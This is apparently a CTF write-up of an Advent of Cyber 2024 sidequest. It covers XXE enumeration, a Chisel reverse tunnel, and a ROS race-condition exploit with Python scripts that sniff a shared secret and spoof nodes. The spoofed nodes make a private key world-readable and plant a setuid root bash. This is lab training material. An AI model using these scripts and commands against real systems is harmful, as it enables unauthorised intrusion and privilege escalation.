****# AOC 2024 Sidequest 2

**Tags**: [[Tech]] [[Cybersecurity]] [[Writeup]]

# Summary

Found the access card from **AOC2024 DAY-5** by enumerating the server with [[XXE]], accessing [[Internal Ports]] and then using it to get access to **AOC2024 Sidequest 2's** rooms. Used [[Tunnelling|tunneling]] and [[ROS]] to exploit [[ROS Nodes|ROS nodes]] that were using a secret to communicate with each other.       

# Context

**AOC2024 Sidequest 2's** access card was hidden in the **AOC2024 Day-5's** task so after I completed the Day-5 I wanted to find the card and complete the Sidequest. Day-5's machine was vulnerable to [[XXE]] and I used this to enumerate for the card. The Sidequest was compromised by one of the characters in the **AOC2024** lore. The room provided password and username for accessing 2 machines **Yin** and **Yang**. It also said that these machines used [[ROS]] and it was behind a firewall. The access card could be used to tear down this firewall.

# Tasks

## Main Task

Get the flags and complete the room.

## Get Card

 Find the access card hidden in Day-5's server.

## Get Flags

Exploit two rooms/servers **Yin** and **Yang** simultaneously to get the flags in each.

# What I Did

## Enumerate using XXE

I read different important files using [[XXE]] but nothing was working. Using `php://filter` to encode the file with [[base64]], I read the source code for the main site but it gave me nothing. I checked what web server it was with [[whatweb]] and it was [[Apache|Apache/2.4.41]]. With this information, I looked up the default paths for apache's config files.

Using the [[XXE]] I read the **apache.conf** and **ports.conf** file. The **ports.conf** file revealed that the server had an internal port open on port **8080**. A request to this port with the same payload showed that it had a file called access.log which had a single log of someone accessing a file with some random name in a random directory. I obtained the access card by reading the file:

![[Pasted image 20241206051653.png]]

## Scan Yin & Yang

 After some time [[nmap]] showed that port **21337** was open on both **Yin** and **Yang.** **21337** was an http server that was a ransomware:

![[Pasted image 20241206051405.png]]

 I used the password from the access card and it worked. The firewall was now off and my [[nmap]] scan showed that [[ssh]] port was open for both **Yin & Yang**. I [[ssh]]ed into both yin and yang using provided credentials and it worked. After looking around and enumerating internally I found this when doing `{shell icon} sudo -l`:

![[Pasted image 20241206080953.png]]

This [[bash]] script setup and ran a [[ROS Nodes|ROS node]] using python. I had read permissions to the python script for the node. Mirroring these steps in **Yang** yielded similar results. I analyzed the source code for both these scripts, going back and forth. Then I ran the scripts to see its behavior, both scripts had their `ROS_MASTER_URI` set to `http://localhost:11311`, I couldn't change this behavior since that was the setup that the [[bash]] script used. This internal [[URI]] meant these nodes could not communicate although they were made for that. After reading some [[ROS]] docs and a lot of thinking I got an idea to use [[Tunnelling|tunneling]] to connect these nodes.

## Tunnel to connect nodes

I quickly got the [[Chisel]] binary from github and spun up a python [[SimpleHTTPServer]] on my machine to server the binary. From **Yin & Yang** I used [[wget]] to get these binaries from my machine.

### Chisel setup

I could run [[Chisel]] server on my machine and tunnel both **Yin & Yang's** 11311 to my own [[ROS Master|ROS master]] but [[ROS]] didn't really have support for [[Kali]] so I didn't bother with that approach. 

#### Yin

`{shell icon} ./chisel server --port <chisel_server_port> --reverse`

#### Yang

`{shell icon}./chisel client <yin_ip>:<chisel_server_port> R:11311:localhost:11311`

## Start ROS master

I started the [[ROS Master|ROS master]] on **Yin** and ran the [[bash]] scripts for both the machines, they started communicating with each other. From their source code earlier I knew that both could send an "action" which was just a command that ran with `{python icon} os.system(action)`, Also they had to send a **secret** when making a request to perform the action.

**Yang** was sending the **secret** as a request to **svc_yang**

```python
rospy.wait_for_service('svc_yang')
try:                              
	service = rospy.ServiceProxy('svc_yang', yangrequest)
	response = service(self.secret, 'touch /home/yin/yang.txt', 'Yang', 'Yin')
except rospy.ServiceException as e:
	...
```

This meant, if I could make a node that advertised the **svc_yang** service, I could get the secret they communicated with. The thing is that it needed verification and after verification the `wait_for_service` was always taken by **Yin**. After some time of source code analysis trying to understand the "protocol" they were using, I noticed that **Yang** was sending it's response *after* performing the action. The action that **Yin** was sending to **Yang** was a simple `touch /home/yang/yin.txt`. This was an eureka moment, it was a [[Race Condition|race condition]].

## Exploit race condition

To exploit this [[Race Condition|race condition]] I tried slowing down the `{shell icon} touch` command using a soft link:

```shell title='nestedlink.sh'
#!/bin/bash

# Create nested directories
mkdir -p nested_dir/$(printf "%d/" {1..1000})

# Create symbolic link
ln nested_dir/$(printf "%d/" {1..1000})yin.txt -s yin.txt
```

Also **Yin** had a rate of 0.5 in `{python icon} rospy.Rate()` so my service had to have a faster rate of advertisement to handle **Yang**'s request instead of the original node.

## Get the channel secret 

I wrote a simple script that advertised as the **svc_yang** in a faster rate than **Yin**:

```python title=sniffer.py
import rospy
from yin.srv import yangrequest


def handle_request(req):
    print(req.secret)

def sniffer():
     rospy.init_node('sniffer')
     rospy.Service('svc_yang', yangrequest, handle_request)
     rospy.Rate(0.05)
     rospy.spin()

sniffer()
```

Then I ran all 3 [[ROS Nodes|nodes]] at the same time, Voila! `sniffer.py` printed out the secret. From the source code of **Yin**, it was using this secret to perform an action sent by **Yang**:

```python
def handle_yang_request(self, req):
	# Check secret first
	  if req.secret != self.secret:
		  return "Secret not valid" 
```

I could now [[Spoof|spoof]] **Yang** to send actions to **Yin** using this secret.

## [[Spoof]]

### Yang

```python title=spoofyang.py
import rospy
from yin.srv import yangrequest

secret = "<secret_from_earlier>"

def send_request():
    global secret
    rospy.init_node("yang")
    rospy.wait_for_service('svc_yang')

    try:
        yang_service = rospy.ServiceProxy('svc_yang', yangrequest)
        res = yang_service(secret, "chmod 777 /catkin_ws/privatekey.pem", "yang", "yin")
        print(res)
    except Exception as e:
        print(e)
        exit()


send_request()
```

I made a simple script to spoof **Yang** and make the `.pem` file that **Yin** used accessible to everyone. Now all I had to was make a copy of the script that ran the **Yin** node and modify it to send commands I want to **Yang**.

### Yin

For spoofing **Yin** all I did was copy the script that made its node and modified it. I didn't need [[sudo]] access because I had the **secret** already and the `.pem` file was now accessible.

## Gain Root

### Yin

First, I copied `/bin/bash` into **Yin's** home folder then used the `spoofyang.py` script to execute these commands: 

1. `chmod +x /home/yin/bash`
2. `chown root:root /home/yin/bash`
3. `chmod u+s /home/yin/bash`

Finally, with the stage setup, I ran `bash -p` to root **Yin**.

### Yang

Root on **Yang** was pretty much the same. I used the spoofed **Yin** node to send actions to **Yang** The format for it was:

`{python icon} message.actionparams = ['chmod +x /home/yang/bash', 'chown root:root /home/yang/bash', 'chmod u+s /home/yang/bash' ]`

## Wrap Up

I got both the flags in the `/root` directory for each server and completed the room.